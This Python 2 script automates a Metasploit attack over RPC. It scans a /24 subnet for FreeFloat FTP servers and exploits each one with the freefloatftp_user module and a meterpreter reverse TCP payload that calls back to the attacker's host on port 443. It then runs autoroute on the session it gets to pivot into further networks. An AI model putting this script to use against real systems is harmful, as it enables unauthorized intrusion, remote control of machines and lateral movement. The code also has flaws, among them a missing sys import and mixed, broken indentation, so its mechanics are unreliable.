from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole
import time
from netaddr import IPNetwork, IPAddress
import re

global global_positive_out
global_positive_out = list()
global global_console_status
global_console_status = False

ftphost = '192.168.0.90'
localhost = '192.168.0.92'

def get_session(sessions_list, exploit_job):
    if not sessions_list:
        return False
    for session in sessions_list:
        if sessions_list[session]['exploit_uuid'] == exploit_job['uuid']:
            return session
    return False

def compare_sessions(old_sessions_list, seconds = 120):
    flag = False
    while not flag:
        if seconds == 0:
            return False
        if client.sessions.list != old_sessions_list:
            flag = True
        time.sleep(1)
        seconds -= 1
    current_sessions = client.sessions.list
    all(map(current_sessions.pop, old_sessions_list))
    return current_sessions

def read_console(console_data):
    global global_console_status
    global_console_status = console_data['busy']
    if '[+]' in console_data['data']:
	sigdata = console_data['data'].rstrip().split('\n')
	for line in sigdata:
	    if '[+]' in line:
		global_positive_out.append(line)
	

client = MsfRpcClient('password')

# cb - callback function, executes when data arrives to console
console = MsfRpcConsole(client, cb=read_console)
time.sleep(10)

console.execute('use auxiliary/scanner/ftp/ftp_version')
console.execute('set RHOSTS 192.168.0.0/24')
console.execute('set THREADS 20')
console.execute('run')
time.sleep(5)

while global_console_status:
    print 'global_console_status: ' + str(global_console_status)
    time.sleep(5)
time.sleep(5)

targets = list()
for line in global_positive_out:
    if 'FreeFloat' in line:
    	ip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', line)[0]
	targets.append(ip)

exploit = client.modules.use('exploit', 'windows/ftp/freefloatftp_user')
pl = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
pl['LPORT'] = 443
pl['LHOST'] = localhost
pl['EXITFUNC'] = 'thread'

old_sessions = client.sessions.list

for target in targets:
    exploit['RHOST'] = target
    ftpsession = exploit.execute(payload=pl)
    time.sleep(5)

ftpsessioncode = get_session(client.sessions.list, ftpsession)
if not ftpsessioncode:
    sys.exit()

print client.sessions.list

shell = client.sessions.session(ftpsessioncode)
shell.read()
while not client.sessions.list[ftpsessioncode]['routes']:
   shell.runsingle('run post/multi/manage/autoroute')
   time.sleep(10)
sread = shell.read()
print sread

shell.read()

routes = client.sessions.list[ftpsessioncode]['routes'].split(",")

for route in routes:
    if IPAddress(ftphost) in IPNetwork(route):
        routes.remove(route)

try:
   console.console.destroy()
except:
   sys.exit()
